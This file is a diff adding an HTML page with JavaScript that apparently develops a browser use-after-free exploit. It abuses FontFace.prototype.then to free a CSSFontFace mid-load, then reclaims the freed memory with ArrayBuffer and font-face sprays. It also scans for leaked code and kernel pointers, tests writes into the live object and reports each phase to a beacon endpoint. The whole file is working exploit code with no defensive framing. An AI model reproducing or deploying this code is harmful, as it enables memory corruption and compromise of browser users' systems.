@@ -1,0 +1,266 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1126</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+function ptrTag(v){if(typeof v!=='bigint'||v===0n)return'';var h=Number(v>>32n);return h>=0x200&&h<=0x7FFF?'C':h>=0x10&&h<=0xFF?'H':h>=0xFFFF8000?'K':v<0x10000n?'s':'v';}
+function snap(b){var r=[];for(var q=0;q<b.length;q++)if(b[q]!==0n)r.push(q+':'+hex64(b[q])+ptrTag(b[q]));return r.length?r.join(','):'Z';}
+
+var S;try{S=JSON.parse(localStorage.getItem('p1126')||'null');}catch(e){S=null;}
+if(!S)S={b:0,h:0,m:0,R:[]};S.b++;
+try{localStorage.setItem('p1126',JSON.stringify(S));}catch(e){}
+
+B('P1126-BOOT','b='+S.b+'|h='+S.h+'|m='+S.m);
+log('phase','P1126: ENGINEERED RECLAIM (boot '+S.b+', '+S.h+' hits)');
+
+if(S.b>60){
+  log('ok','DONE. '+S.h+' hits');
+  B('P1126-DONE','h='+S.h+'|m='+S.m);
+  for(var i=0;i<S.R.length;i++)B('P1126-R'+i,S.R[i]);
+}else{
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8,r=S.b,fired=false,map=null,found=false;
+
+// ===== KEY: ff is declared here but will be NULLED after hit =====
+var ff=null;
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:r"+r+";src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+ff=new FontFace('f'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(fired)return undefined;fired=true;
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  map=[];
+  for(var si=0;si<SIZES.length;si++){var sz=SIZES[si];for(var k=0;k<K;k++)map.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});}
+  try{document.fonts.check('1em r'+r);}catch(e){}
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em f'+r+', r'+r,'AB').then(function(){},function(){});
+
+// Detect hit via proven polling pattern
+for(var t=5;t<=250;t+=2){(function(ms){setTimeout(function(){
+  if(found||!map)return;
+  for(var bi=20;bi<56;bi++){
+    if(!map[bi])continue;
+    var b=new BigUint64Array(map[bi].ab);
+    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+    if(nz>0&&!found){
+      found=true;S.h++;
+      var hb=b,hbi=bi;
+
+      // Read original CSSFontFace values
+      var origSnap=snap(b);
+      B('P1126-HIT','r'+r+'|bi='+bi+'|ms='+ms+'|'+origSnap);
+      log('win','HIT! '+origSnap);
+
+      // ===== PHASE 1: NULL the JS reference to allow GC =====
+      // This is THE KEY DIFFERENCE from P1124
+      ff=null;  // Release JS FontFace wrapper reference
+      B('P1126-NULL','ff_nulled');
+      log('info','Phase 1: ff=null, releasing JS reference');
+
+      // ===== PHASE 2: Force GC via allocation pressure =====
+      setTimeout(function(){
+        log('info','Phase 2: Forcing GC...');
+
+        // Method A: Massive allocation pressure
+        var gcPressure=[];
+        for(var g=0;g<500;g++){
+          gcPressure.push(new ArrayBuffer(4096));
+          gcPressure.push({a:g,b:'gc_pressure_'+g,c:[g,g+1,g+2]});
+        }
+        // Let them go
+        gcPressure=null;
+
+        // Method B: More pressure — create and discard large strings
+        for(var g=0;g<100;g++){
+          var s='';for(var j=0;j<1000;j++)s+='X';
+          void s.length;
+        }
+
+        // Method C: Create and discard FontFace objects (same type!)
+        for(var g=0;g<200;g++){
+          try{
+            var tmpFF=new FontFace('gc'+r+'_'+g,'local(Arial)',{unicodeRange:'U+0041'});
+            void tmpFF.status;
+          }catch(e){}
+        }
+
+        // Check: did the original CSSFontFace get freed (wiped to zero)?
+        var afterGC=snap(hb);
+        B('P1126-GC','afterGC='+afterGC);
+        log('info','After GC: '+afterGC);
+
+        // ===== PHASE 3: Spray CSSFontFace objects for same-type reclaim =====
+        setTimeout(function(){
+          log('info','Phase 3: Spraying 2000 CSSFontFace objects...');
+
+          // Create spray CSS rules (creates CSSFontFace in engine)
+          var sprayCSS='';
+          for(var i=0;i<1000;i++){
+            sprayCSS+="@font-face{font-family:'sp"+r+"_"+i+"';src:local(Arial);unicode-range:U+00"+(41+(i%26)).toString(16).toUpperCase()+";}";
+          }
+          var spSt=document.createElement('style');
+          spSt.textContent=sprayCSS;
+          document.head.appendChild(spSt);
+
+          // Also spray via JS FontFace API
+          var sprayFF=[];
+          for(var i=0;i<1000;i++){
+            try{
+              var sf=new FontFace('jsp'+r+'_'+i,'local(Arial)',{unicodeRange:'U+00'+(41+(i%26)).toString(16).toUpperCase()});
+              document.fonts.add(sf);
+              sprayFF.push(sf);
+            }catch(e){break;}
+          }
+
+          B('P1126-SPRAY','css=1000|js='+sprayFF.length);
+
+          // Force font resolution
+          document.body.offsetHeight;
+          try{document.fonts.check('1em sp'+r+'_0');}catch(e){}
+
+          // ===== PHASE 4: Check for reclaim at intervals =====
+          var reclaimed=false;
+          var checkTimes=[5,10,20,50,100,200,500];
+          for(var ci=0;ci<checkTimes.length;ci++){(function(dt){
+            setTimeout(function(){
+              if(reclaimed)return;
+              var s=snap(hb);
+              if(s==='Z'){
+                B('P1126-ZEROED','dt='+dt);
+                log('info','Still zeroed at +'+dt+'ms after spray');
+              }else{
+                // Something wrote to our slot!
+                reclaimed=true;
+                B('P1126-RECLAIM','dt='+dt+'|'+s);
+                log('win','*** RECLAIM at +'+dt+'ms! '+s+' ***');
+
+                // Analyze the reclaimed values
+                for(var q=0;q<hb.length;q++){
+                  if(hb[q]!==0n){
+                    var tag=ptrTag(hb[q]);
+                    var val=hex64(hb[q]);
+                    if(tag==='C'){
+                      B('P1126-CODE','q='+q+'|'+val);
+                      log('win','***** CODE POINTER at q'+q+': '+val+' *****');
+                    }else if(tag==='H'){
+                      log('ptr','HEAP at q'+q+': '+val);
+                    }else if(tag==='K'){
+                      B('P1126-KERN','q='+q+'|'+val);
+                      log('win','***** KERNEL POINTER at q'+q+': '+val+' *****');
+                    }
+                  }
+                }
+
+                // Full dump for analysis
+                var dump=[];
+                for(var q=0;q<hb.length;q++)dump.push(q+':'+hex64(hb[q]));
+                S.R.push('RECLAIM|'+dump.join(','));
+
+                // ===== PHASE 5: Write test — can we corrupt the live CSSFontFace? =====
+                // Write distinctive values to key offsets and see if anything crashes
+                // Offset 0 = refcount (DON'T corrupt, crash risk)
+                // Offset 11 (+88) = m_cssFontFace pointer
+                // Offset 13 (+104) = another member pointer
+                // For now, just verify we can read the new live values
+                setTimeout(function(){
+                  var postSnap=snap(hb);
+                  B('P1126-POST','stable='+postSnap);
+                  // Try writing to a non-critical offset to verify write works
+                  var origQ3=hb[3];
+                  hb[3]=BigInt('0xAAAABBBBCCCCDDDD');
+                  setTimeout(function(){
+                    var readBack=hb[3];
+                    var writeWorked=(readBack===BigInt('0xAAAABBBBCCCCDDDD'));
+                    hb[3]=origQ3; // Restore!
+                    B('P1126-WRITE','worked='+writeWorked+'|rb='+hex64(readBack));
+                    log(writeWorked?'win':'fail','Write test: '+(writeWorked?'SUCCESS':'FAILED'));
+
+                    if(writeWorked){
+                      // ===== PHASE 6: Trigger font use to see if our corruption takes effect =====
+                      // Use one of the spray fonts in a layout
+                      var testDiv=document.createElement('div');
+                      testDiv.style.fontFamily="'jsp"+r+"_0', Arial";
+                      testDiv.textContent='ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+                      document.body.appendChild(testDiv);
+                      document.body.offsetHeight;
+                      setTimeout(function(){
+                        var finalSnap=snap(hb);
+                        B('P1126-FINAL','post_use='+finalSnap);
+                        log('info','After font use: '+finalSnap);
+                        try{document.body.removeChild(testDiv);}catch(e){}
+                        try{localStorage.setItem('p1126',JSON.stringify(S));}catch(e){}
+                      },50);
+                    }else{
+                      try{localStorage.setItem('p1126',JSON.stringify(S));}catch(e){}
+                    }
+                  },10);
+                },50);
+              }
+              try{localStorage.setItem('p1126',JSON.stringify(S));}catch(e){}
+            },dt);
+          })(checkTimes[ci]);}
+
+          // ===== PHASE 4b: If not reclaimed after 500ms, try deleting spray to churn =====
+          setTimeout(function(){
+            if(reclaimed)return;
+            log('info','No reclaim after 500ms, churning...');
+
+            // Delete half the spray objects
+            for(var i=0;i<500;i++){
+              try{document.fonts.delete(sprayFF[i]);}catch(e){}
+            }
+            // Create new ones to fill freed slots
+            for(var i=0;i<500;i++){
+              try{
+                var nf=new FontFace('churn'+r+'_'+i,'local(Arial)',{unicodeRange:'U+0061'});
+                document.fonts.add(nf);
+              }catch(e){}
+            }
+
+            // Check again
+            setTimeout(function(){
+              var churnSnap=snap(hb);
+              B('P1126-CHURN','after_churn='+churnSnap);
+              if(churnSnap!=='Z'){
+                log('win','RECLAIM after churn! '+churnSnap);
+                S.R.push('CHURN_RECLAIM|'+churnSnap);
+              }else{
+                log('fail','Still no reclaim');
+                S.R.push('NO_RECLAIM');
+              }
+              try{localStorage.setItem('p1126',JSON.stringify(S));}catch(e){}
+            },100);
+          },700);
+
+        },30); // spray delay
+
+      },20); // GC delay
+
+      try{localStorage.setItem('p1126',JSON.stringify(S));}catch(e){}
+    }
+  }
+},ms);})(t);}
+
+// Miss timeout
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  if(!found){
+    S.m++;
+    B('P1126-M','r'+r);
+    try{localStorage.setItem('p1126',JSON.stringify(S));}catch(e){}
+  }
+},350);
+
+}
+</script></body></html>
